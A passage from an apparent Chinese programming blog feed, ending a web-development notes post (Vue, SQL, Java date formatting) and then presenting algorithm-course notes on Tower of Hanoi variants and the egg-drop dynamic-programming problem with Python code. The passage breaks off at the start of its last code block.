class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">return</span> bb.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">sub</span>) =&gt;</span> &#123;<br>                    <span class="hljs-keyword">return</span> sub === item;<br>                &#125;);<br>            &#125;);<br>        &#125;,<br></code></pre></td></tr></table></figure><h3 id="7、根据身份证号计算年龄sql"><a href="#7、根据身份证号计算年龄sql" class="headerlink" title="7、根据身份证号计算年龄sql"></a>7、根据身份证号计算年龄sql</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,<br>idCard,<br>(<span class="hljs-built_in">substring</span>(now(),<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)<span class="hljs-operator">-</span><span class="hljs-built_in">substring</span>(idCard,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>))<span class="hljs-operator">-</span>(<span class="hljs-built_in">substring</span>(idCard,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>)<span class="hljs-operator">-</span>date_format(now(),<span class="hljs-string">&#x27;%m%d&#x27;</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span>) <span class="hljs-keyword">as</span> age<br><span class="hljs-keyword">from</span> patient_info<br></code></pre></td></tr></table></figure><h3 id="8、给提示信息"><a href="#8、给提示信息" class="headerlink" title="8、给提示信息"></a>8、给提示信息</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">this</span>.$notify(&#123;<br>                <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;提示信息&#x27;</span>,<br>                <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;账号或密码错误&#x27;</span>,<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span><br>              &#125;)<br><br><span class="hljs-variable language_">this</span>.$notify(&#123;<br>                <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;提示信息&#x27;</span>,<br>                <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;登录成功&#x27;</span>,<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;success&#x27;</span><br>              &#125;)<br></code></pre></td></tr></table></figure><h3 id="9、input框的一些属性"><a href="#9、input框的一些属性" class="headerlink" title="9、input框的一些属性"></a>9、input框的一些属性</h3><p>9.1 使用value可设置默认值</p><p>9.2 使用<code>@keyup.enter.native=&quot;search&quot;</code>可以敲回车调用方法</p><p>9.3 你可以用 <code>v-model</code> 指令在表单 <code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code> 及 <code>&lt;select&gt;</code> 元素上创建双向数据绑定。<code>v-model</code> 会忽略所有表单元素的 <code>value</code>、<code>checked</code>、<code>selected</code> attribute 的初始值而总是将 Vue 实例的数据作为数据来源。你应该通过 JavaScript 在组件的 <code>data</code> 选项中声明初始值。</p><p>9.4 <code>placeholder=&quot;输入关键字搜索&quot;</code>默认值</p><h3 id="10、前端日期传给后端出现json格式错误"><a href="#10、前端日期传给后端出现json格式错误" class="headerlink" title="10、前端日期传给后端出现json格式错误"></a>10、前端日期传给后端出现json格式错误</h3><p>在实体类里加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.entity;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.annotation.JsonFormat;<br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> org.springframework.format.annotation.DateTimeFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> &#123;<br>    <span class="hljs-keyword">private</span> Long id;<span class="hljs-comment">//自增主键</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd&quot;, timezone = &quot;GMT+8&quot;)</span><br>    <span class="hljs-keyword">private</span> Date createTime;<span class="hljs-comment">//订单创建时间</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd&quot;, timezone = &quot;GMT+8&quot;)</span><br>    <span class="hljs-keyword">private</span> Date orderDay;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>大致就想到这些，可能再有就是一些小细节，想说完全不太可能，总的来说还是收获颇丰的。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>springboot</tag>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法设计</title>
    <link href="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/"/>
    <url>/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h1><p><strong>教学内容</strong></p><ul><li><p>NP难问题的近似算法：NP难问题没有多项式时间精确算法，除非P&#x3D;NP，如何在多项式时间内寻找近似最优解。</p></li><li><p>在线算法：输入缺乏先验，随着时间的推移分别在线到达。如何设计算法，使性能和事先拥有全部信息的算法相近。</p></li><li><p>流式算法：解决在严重存储限制下的大型数据集上的问题，例如在高速网络环境中，</p></li><li><p>博弈论算法：输入由许多不同利益不同的参与者控制，</p></li></ul><p><strong>课程目标</strong></p><ul><li><p>巩固利用计算思维求解复杂问题的能力，掌握定量的问题分析、设计和程序实现的方法。</p></li><li><p>掌握基本的算法实现技能，进一步学习掌握算法开发方法。</p></li><li><p>掌握从具体问题出发独立查阅各种途径的资料来分析解决问题的能力。</p></li><li><p>掌握分析和建立计算机领域的问题模型的能力， 提高按照规范编写程序，培养良好的程序设计习惯。</p></li></ul><p><strong>科学范式</strong></p><ul><li>实验归纳：人类早期的科学实践，以记录描述自然现象为主要特征，称为“实验科学”（第一范式） </li><li>模型推演：科学家尝试简化模型，去掉干扰，留下关键因素，通过演算进行归纳总结（第二范式） </li><li>仿真模拟：随着计算机仿真越来越多成熟，可以逐渐取代实验，成为科研的常规方法（第三范式） </li><li>数据密集型科学发现：随着数据的爆炸性增长，计算机将不仅仅能做模拟仿真，还能进行分析总结，得到理论（第四范式）</li></ul><h3 id="1、三柱-x2F-四柱汉诺塔-x2F-动态规划"><a href="#1、三柱-x2F-四柱汉诺塔-x2F-动态规划" class="headerlink" title="1、三柱&#x2F;四柱汉诺塔&#x2F;动态规划"></a>1、三柱&#x2F;四柱汉诺塔&#x2F;动态规划</h3><h4 id="递归分析"><a href="#递归分析" class="headerlink" title="递归分析"></a>递归分析</h4><p>用递归树可视化递归过程</p><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-04-14_204251.png" alt="2022-04-14_204251"></p><p>分治算法的主定理：$T(n) &#x3D; aT(\frac n b +cn^k)$</p><ul><li>若$a &gt; b^k$，则$T(n)&#x3D;O(n^{log_ba})$</li><li>若$a &#x3D; b^k$，则$T(n) &#x3D; O(n^klog_bn)$</li><li>若$a &lt; b^k$，则$T(n) &#x3D; O(n^k)$</li></ul><h4 id="Tower-of-Hanoi"><a href="#Tower-of-Hanoi" class="headerlink" title="Tower of Hanoi"></a>Tower of Hanoi</h4><p>1883年由爱德华·卢卡斯提出</p><p>问题描述：由三个木桩和一组n个直径不同的圆盘组成，这些圆盘可以堆叠在木桩上。初始情况是圆盘按大小顺序堆放在一个木桩上，最大的在底部。规则为允许圆盘一次从一个木桩移动到另一个，大盘不能放在小盘的顶部。目标是以最少的移动次数将所有圆盘转移到另一个目标木桩上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 输出移动方式，用num存储移动次数，暴力解</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanoi3</span>(<span class="hljs-params">n,A,B,C</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    三柱汉诺塔</span><br><span class="hljs-string">    A:初始柱 B:过渡柱 C:目标柱</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">global</span> num<br>    num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;disk[<span class="hljs-subst">&#123;n&#125;</span>]: from <span class="hljs-subst">&#123;A&#125;</span> to <span class="hljs-subst">&#123;C&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        hanoi3(n-<span class="hljs-number">1</span>, A, C, B)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;disk[<span class="hljs-subst">&#123;n&#125;</span>]: from <span class="hljs-subst">&#123;A&#125;</span> to <span class="hljs-subst">&#123;B&#125;</span>&#x27;</span>)<br>        hanoi3(n-<span class="hljs-number">1</span>, B, A, C)<br><br><span class="hljs-comment">#测试</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-string">&#x27;主程序&#x27;</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># num = 0</span><br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入盘数：&#x27;</span>))  <span class="hljs-comment"># 盘数</span><br>        hanoi3(n, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>        <span class="hljs-built_in">print</span>(num)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; ---END--- &#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="四柱汉诺塔"><a href="#四柱汉诺塔" class="headerlink" title="四柱汉诺塔"></a>四柱汉诺塔</h4><p>当我们有大于3根柱子的时候，如何移动才能最优？</p><p>Frame-Stewart算法</p><ul><li>使用4根柱子将最上面的k个盘片移到一个临时柱子</li><li>使用剩余的3根柱子将剩余的盘片移到目标柱子</li><li>使用4根柱子将k个盘片从临时柱子移到目标柱子</li></ul><p>优化问题：如何选择最优的k？</p><ul><li>动态规划：存在重叠子问题</li><li>是否存在解析解？</li></ul><h3 id="2、四柱汉诺塔的最优解法-x2F-高楼扔鸡蛋"><a href="#2、四柱汉诺塔的最优解法-x2F-高楼扔鸡蛋" class="headerlink" title="2、四柱汉诺塔的最优解法&#x2F;高楼扔鸡蛋"></a>2、四柱汉诺塔的最优解法&#x2F;高楼扔鸡蛋</h3><h4 id="解四柱汉诺塔"><a href="#解四柱汉诺塔" class="headerlink" title="解四柱汉诺塔"></a>解四柱汉诺塔</h4><p>公式：$M_4(n)&#x3D;2M_4(n-k)+M_3(k)$</p><p>初始条件：$M_4(1)&#x3D;1$ and $M_3(k)&#x3D;2^k-1$</p><blockquote><p>解释：先用四柱的方式将上<code>n-k</code>个盘子放在某过渡柱上，再用三柱的方式将下<code>k</code>个盘子放在目标柱上，再用四柱的方式将过渡柱上的<code>n-k</code>个盘子放在目标柱上</p><p>$M_4(n)$：以四柱的方式放n个盘子最少需要多少次</p><p><code>n</code>：需要放的盘子总数</p><p><code>k</code>：以三柱的方式放多少个盘子</p></blockquote><p>引出问题：<code>k</code>如何取值？</p><p>暴力：对于输入k，遍历k&#x3D;1…n的结果，取遍历出的最小值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanoi4</span>(<span class="hljs-params">n</span>):<br>    m = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n):<br>        tmp = <span class="hljs-number">2</span>*hanoi4(n-i) + math.<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,i)-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> tmp &lt; m:<br>            m = tmp<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-string">&#x27;主程序&#x27;</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入盘数：&#x27;</span>))  <span class="hljs-comment"># 盘数</span><br>        <span class="hljs-built_in">print</span>(hanoi4(n))<br></code></pre></td></tr></table></figure><p>优化方式：用一个数组来存储计算过的$M_4(n-k)$的值，遍历时优先查表</p><table><thead><tr><th>$n$</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th></tr></thead><tbody><tr><td>$M_3$</td><td>1</td><td>3</td><td>7</td><td>15</td><td>31</td><td>63</td><td>127</td><td>255</td><td>511</td><td>1023</td></tr><tr><td>$M_4$</td><td>1</td><td>3</td><td>5</td><td>9</td><td>13</td><td>17</td><td>25</td><td>33</td><td>41</td><td>49</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 带备忘录的解法</span><br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanoi4_memo</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">global</span> memo<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> memo[n] != <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>): <span class="hljs-keyword">return</span> memo[n]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n):<br>        tmp = <span class="hljs-number">2</span>*hanoi4_memo(n-i) + math.<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,i) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> tmp &lt; memo[n]:<br>            memo[n] = <span class="hljs-built_in">int</span>(tmp)<br>    <span class="hljs-keyword">return</span> memo[n]<br><br><span class="hljs-comment"># 测试</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入盘数：&#x27;</span>))  <span class="hljs-comment"># 盘数</span><br>        memo = [<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)]*(n+<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(hanoi4_memo(n))<br></code></pre></td></tr></table></figure><p>最优解：</p><p>三角形数：$t_k &#x3D; \frac{k(k+1)}{2}$ 也即<code>1,3,6,10,15,21</code></p><table><thead><tr><th>$k$</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody><tr><td>$t_k$</td><td>1</td><td>3</td><td>6</td><td>10</td><td>15</td><td>21</td><td>28</td></tr></tbody></table><p>令$M(t_k) &#x3D; 2M(t_{k-1}) + 2^k-1$ ，初始条件$M(1)&#x3D;1$</p><blockquote><p>Frame和Stewart证明：</p><p>若$n&#x3D;t_k$，最优选择就是k；</p><p>当$t_{k-1} &lt; n &lt; t_k$时，<code>k-1</code>和<code>k</code>都是最优解。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># dp数组的迭代解法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanoi4_dp</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-comment"># 得到三柱汉诺塔的最少次数列表</span><br>    hanoi3 = [<span class="hljs-number">0</span>]*n<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        hanoi3[i] = <span class="hljs-built_in">int</span>(math.<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,i)-<span class="hljs-number">1</span>)<br>    dp = [<span class="hljs-number">0</span>]*(n+<span class="hljs-number">1</span>)<br>    dp[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 计算四柱汉诺塔</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 得到使用三柱方法的柱数k</span><br>        k=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,i):<br>            <span class="hljs-keyword">if</span> i &lt;= j*(j+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>: <br>                k = j<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 算四柱的dp数组</span><br>        dp[i]=<span class="hljs-number">2</span>*dp[i-k]+hanoi3[k]<br>    <span class="hljs-keyword">return</span> dp[n]<br></code></pre></td></tr></table></figure><h4 id="高楼扔鸡蛋"><a href="#高楼扔鸡蛋" class="headerlink" title="高楼扔鸡蛋"></a>高楼扔鸡蛋</h4><p>问题描述：n层楼，k个鸡蛋，算最少的尝试次数，找到鸡蛋恰好摔碎的那层楼（以下都不碎，以上都会碎）</p><p>注：n,k至少为1，最坏情况：鸡蛋破碎一定发生在搜索空间穷尽时</p><p>条件：n层楼、k个鸡蛋</p><p>选择：去哪层楼扔</p><p>条件发生变化：在第i层扔下鸡蛋后</p><p>鸡蛋碎了：<code>k=k-1</code>，搜索区间<code>[1,i-1]</code>共<code>i-1</code>层</p><p>鸡蛋没碎：<code>k</code>不变，搜索区间<code>[i+1,n]</code>共<code>n-i</code>层</p><p>分别遍历两种可能，然后选择次数更多的一个（较差的情况下），加上初始扔的一次，就是初始在i层楼扔下鸡蛋需要的尝试次数。</p><p>用i遍历n，找出初始在每层楼需要的尝试次数，取最小值，即为所求次数。</p><blockquote><p>解题思路：</p><p>1、定义F(n,k)：n层楼，k个鸡蛋时，至少要扔几次鸡蛋</p><p>2、状态转移方程： $F(n,k)&#x3D;min_{1\le i\le n}(max(F(n-i,k),F(i-1,k-1))+1)$</p><p>3、base case： $F(0,x)&#x3D;0,F(x,1)&#x3D;x$</p></blockquote><p>暴力解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># n:楼层数，k:鸡蛋数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eggDrop</span>(<span class="hljs-params">n,k</span>):<br>    res = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>    <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>: <span class="hljs-keyword">return</span> n<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>        tmp = <span class="hljs-built_in">max</span>(eggDrop(n-i,k),eggDrop(i-<span class="hljs-number">1</span>,k-<span class="hljs-number">1</span>))+<span class="hljs-number">1</span><br>        res = <span class="hljs-built_in">min</span>(res,tmp)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-comment"># 测试</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        n,k=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入楼层数和鸡蛋数，用逗号隔开：&quot;</span>))<br>        <span class="hljs-built_in">print</span>(eggDrop(n,k))<br></code></pre></td></tr></table></figure><p>优化：添加备忘录消除重叠子问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># n:楼层数，k:鸡蛋数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">superEggDrop</span>(<span class="hljs-params">n,k</span>):<br>    memo = <span class="hljs-built_in">dict</span>()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">n,k</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># base case</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>: <span class="hljs-keyword">return</span> n<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        <span class="hljs-comment"># 避免重复计算</span><br>        <span class="hljs-keyword">if</span> (n,k) <span class="hljs-keyword">in</span> memo:<br>            <span class="hljs-keyword">return</span> memo[(n,k)]<br>        res = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>        <span class="hljs-comment"># 穷举所有的可能</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>            res = <span class="hljs-built_in">min</span>(res, <span class="hljs-built_in">max</span>(dp(n-i,k),dp(i-<span class="hljs-number">1</span>,k-<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>)<br>        memo[(n,k)] = res<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">return</span> dp(n,k)<br></code></pre></td></tr></table></figure><p>优化：二分搜索代替线性搜索优化for循环</p><p>思路：<code>dp(n,k)</code>这个函数，当<code>k</code>固定时，是关于<code>n</code>单调递增的（鸡蛋数量固定时，楼层越多，需要的尝试次数越多），于是将<code>dp(n-i,k)</code>和<code>dp(i-1,k-1)</code>看做关于<code>i</code>的函数，所以<code>dp(n-i,k)</code>是关于<code>i</code>单调递减，<code>dp(i-1,k-1)</code>是关于<code>i</code>单调递增。</p><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/d2253affeade7b0d8c4128c5e193ab0.jpg" alt="d2253affeade7b0d8c4128c5e193ab0"></p><p>于是，问题便成了求二者的交点，可以用二分查找来寻找这个点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">superEggDrop2</span>(<span class="hljs-params">n,k</span>):<br>    memo = <span class="hljs-built_in">dict</span>()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">n,k</span>):<br>        <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">1</span>: <span class="hljs-keyword">return</span> n<br>        <span class="hljs-keyword">if</span> (n,k) <span class="hljs-keyword">in</span> memo:<br>            <span class="hljs-keyword">return</span> memo[(n,k)]<br>        res = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;INF&#x27;</span>)<br>        <span class="hljs-comment"># 用二分代替线性搜索</span><br>        low, high = <span class="hljs-number">1</span>, n<br>        <span class="hljs-keyword">while</span> low &lt;= high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            broken = dp(mid-<span class="hljs-number">1</span>,k-<span class="hljs-number">1</span>) <span class="hljs-comment"># 碎</span><br>            non_broken = dp(n-mid,k) <span class="hljs-comment"># 没碎</span><br>            <span class="hljs-comment"># res = min(max(碎，没碎) +1)</span><br>            <span class="hljs-keyword">if</span> broken &gt; non_broken:<br>                high = mid-<span class="hljs-number">1</span><br>                res = <span class="hljs-built_in">min</span>(res,broken+<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>                res = <span class="hljs-built_in">min</span>(res, non_broken+<span class="hljs-number">1</span>)<br>        memo[(n,k)] = res<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">return</span> dp(n,k)<br></code></pre></td></tr></table></figure><p>优化：重新定义状态转移</p><p>定义：k：鸡蛋数，m：最少扔鸡蛋次数，dp(k,m)：最高楼层数</p><p>鸡蛋碎了：测楼下</p><p>鸡蛋没碎：测楼上</p><p>总的楼层数 &#x3D; 楼上的楼层数 + 楼下的楼层数 + 1（当前这层楼）</p><p>状态转移方程：<code>dp[k][m] = dp[k][m-1] + dp[k-1][m-1] + 1</code></p><p><code>dp[k][m-1]</code>：楼上的楼层数</p><p><code>dp[k-1][m-1]</code>：楼下的楼层数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 